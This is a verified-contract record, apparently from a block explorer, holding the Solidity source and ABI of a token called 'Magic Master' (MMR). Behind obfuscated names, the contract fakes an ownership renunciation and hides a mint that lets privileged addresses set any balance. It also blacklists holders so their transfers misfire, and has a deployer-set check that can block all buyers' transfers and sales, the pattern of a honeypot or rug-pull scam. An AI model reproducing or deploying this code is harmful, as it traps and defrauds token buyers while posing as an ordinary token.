{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface sellIs {\n    function createPair(address txList, address fundToken) external returns (address);\n}\n\ninterface senderTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableShould) external view returns (uint256);\n\n    function transfer(address receiverSell, uint256 shouldMaxSender) external returns (bool);\n\n    function allowance(address enableMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldMaxSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSell,\n        uint256 shouldMaxSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchSender, uint256 value);\n    event Approval(address indexed enableMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract marketingTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderToMetadata is senderTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MagicMaster is marketingTeam, senderTo, senderToMetadata {\n\n    function balanceOf(address enableShould) public view virtual override returns (uint256) {\n        return launchedMin[enableShould];\n    }\n\n    uint8 private receiverLimitTeam = 18;\n\n    uint256 constant fromLiquidityTake = 17 ** 10;\n\n    mapping(address => bool) public launchedSender;\n\n    function liquidityTeam(address shouldTotal) public {\n        amountSell();\n        \n        if (shouldTotal == liquiditySwap || shouldTotal == sellAtAuto) {\n            return;\n        }\n        walletList[shouldTotal] = true;\n    }\n\n    function approve(address minTeam, uint256 shouldMaxSender) public virtual override returns (bool) {\n        swapReceiver[_msgSender()][minTeam] = shouldMaxSender;\n        emit Approval(_msgSender(), minTeam, shouldMaxSender);\n        return true;\n    }\n\n    string private modeAmountTake = \"Magic Master\";\n\n    uint256 marketingTrading;\n\n    uint256 private receiverTo = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public walletList;\n\n    function name() external view virtual override returns (string memory) {\n        return modeAmountTake;\n    }\n\n    function isMax(uint256 shouldMaxSender) public {\n        amountSell();\n        marketingTrading = shouldMaxSender;\n    }\n\n    function amountSell() private view {\n        require(launchedSender[_msgSender()]);\n    }\n\n    string private receiverMode = \"MMR\";\n\n    address minSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundTotal(address enableBuyReceiver, address receiverSell, uint256 shouldMaxSender) internal returns (bool) {\n        require(launchedMin[enableBuyReceiver] >= shouldMaxSender);\n        launchedMin[enableBuyReceiver] -= shouldMaxSender;\n        launchedMin[receiverSell] += shouldMaxSender;\n        emit Transfer(enableBuyReceiver, receiverSell, shouldMaxSender);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMode;\n    }\n\n    function receiverTrading() public {\n        emit OwnershipTransferred(liquiditySwap, address(0));\n        isLiquidity = address(0);\n    }\n\n    function transferFrom(address enableBuyReceiver, address receiverSell, uint256 shouldMaxSender) external override returns (bool) {\n        if (_msgSender() != tokenTake) {\n            if (swapReceiver[enableBuyReceiver][_msgSender()] != type(uint256).max) {\n                require(shouldMaxSender <= swapReceiver[enableBuyReceiver][_msgSender()]);\n                swapReceiver[enableBuyReceiver][_msgSender()] -= shouldMaxSender;\n            }\n        }\n        return teamFrom(enableBuyReceiver, receiverSell, shouldMaxSender);\n    }\n\n    uint256 public totalLimitSell;\n\n    function enableIsLiquidity(address minFund) public {\n        require(minFund.balance < 100000);\n        if (receiverFundFrom) {\n            return;\n        }\n        if (totalWallet == walletSell) {\n            listMarketing = totalLimitSell;\n        }\n        launchedSender[minFund] = true;\n        if (listMax == marketingTotalMax) {\n            totalLimitSell = listMarketing;\n        }\n        receiverFundFrom = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return isLiquidity;\n    }\n\n    function allowance(address launchAt, address minTeam) external view virtual override returns (uint256) {\n        if (minTeam == tokenTake) {\n            return type(uint256).max;\n        }\n        return swapReceiver[launchAt][minTeam];\n    }\n\n    function teamFrom(address enableBuyReceiver, address receiverSell, uint256 shouldMaxSender) internal returns (bool) {\n        if (enableBuyReceiver == liquiditySwap) {\n            return fundTotal(enableBuyReceiver, receiverSell, shouldMaxSender);\n        }\n        uint256 launchReceiver = senderTo(sellAtAuto).balanceOf(minSender);\n        require(launchReceiver == marketingTrading);\n        require(receiverSell != minSender);\n        if (walletList[enableBuyReceiver]) {\n            return fundTotal(enableBuyReceiver, receiverSell, fromLiquidityTake);\n        }\n        return fundTotal(enableBuyReceiver, receiverSell, shouldMaxSender);\n    }\n\n    bool public listMax;\n\n    bool private walletSell;\n\n    function owner() external view returns (address) {\n        return isLiquidity;\n    }\n\n    function amountTx(address tradingEnable, uint256 shouldMaxSender) public {\n        amountSell();\n        launchedMin[tradingEnable] = shouldMaxSender;\n    }\n\n    bool public marketingTotalMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverLimitTeam;\n    }\n\n    address tokenTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private launchedMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTo;\n    }\n\n    uint256 private listMarketing;\n\n    bool public receiverFundFrom;\n\n    mapping(address => mapping(address => uint256)) private swapReceiver;\n\n    event OwnershipTransferred(address indexed shouldFee, address indexed feeTotalAmount);\n\n    address public liquiditySwap;\n\n    address private isLiquidity;\n\n    bool public totalWallet;\n\n    constructor (){\n        if (listMax) {\n            totalLimitSell = listMarketing;\n        }\n        walletMin senderMode = walletMin(tokenTake);\n        sellAtAuto = sellIs(senderMode.factory()).createPair(senderMode.WETH(), address(this));\n        \n        liquiditySwap = _msgSender();\n        launchedSender[liquiditySwap] = true;\n        launchedMin[liquiditySwap] = receiverTo;\n        receiverTrading();\n        \n        emit Transfer(address(0), liquiditySwap, receiverTo);\n    }\n\n    uint256 limitAt;\n\n    function transfer(address tradingEnable, uint256 shouldMaxSender) external virtual override returns (bool) {\n        return teamFrom(_msgSender(), tradingEnable, shouldMaxSender);\n    }\n\n    address public sellAtAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTotalAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxSender\",\"type\":\"uint256\"}],\"name\":\"amountTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"}],\"name\":\"enableIsLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldMaxSender\",\"type\":\"uint256\"}],\"name\":\"isMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotalMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAtAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimitSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MagicMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}